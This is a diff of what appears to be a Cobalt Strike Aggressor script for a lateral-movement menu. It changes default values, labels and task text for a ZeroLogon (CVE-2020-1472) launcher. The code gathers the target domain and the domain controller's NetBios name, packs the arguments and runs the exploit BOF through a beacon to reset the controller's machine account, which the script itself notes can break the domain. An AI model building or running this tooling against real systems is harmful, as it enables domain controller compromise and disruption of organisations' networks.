@@ -56,10 +56,10 @@ menu "☆ 横向移动" {
     }	
 	item "ZeroLogonBOF" {
 		blog($1, "\c9=========== ZeroLogonBOF ==========");
-        $dialog = dialog("ZeroLogon", %( bid => $1["@"] , Domain => "xstark.sec" , NetBios => "DomainAD" , arch => "x64") ,&ZeroLogon);
+        $dialog = dialog("ZeroLogon", %( bid => $1["@"] , Domain => "xstark.sec" , NetBios => "DCX" , arch => "x64") ,&ZeroLogon);
         dialog_description($dialog,"ZeroLogon（CVE-2020-1472）攻击可能导致主机脱域！参考：https://github.com/rsmudge/ZeroLogon-BOF");
         drow_text($dialog,"Domain","域名:");
-        drow_text($dialog,"NetBios","域控NetBios:");
+        drow_text($dialog,"NetBios","域控 NetBios:");
         drow_combobox($dialog,"arch","Arch:",@("x64","x86"));
         dbutton_action($dialog,"Exploit");
         dialog_show($dialog);
@@ -74,7 +74,7 @@ menu "☆ 横向移动" {
         closef($handle);
         # build our arguments
         $args = bof_pack($bid,"ZZZ",$fqdn,$3["NetBios"],$3["NetBios"] . '$');
-        btask($bid, "Reset  Domain via CVE-2020-1472");
+        btask($bid, "Reset $netbios $+ \$ machine account via CVE-2020-1472");
         # execute it.
         beacon_inline_execute($bid, $data, "go", $args);
     }	
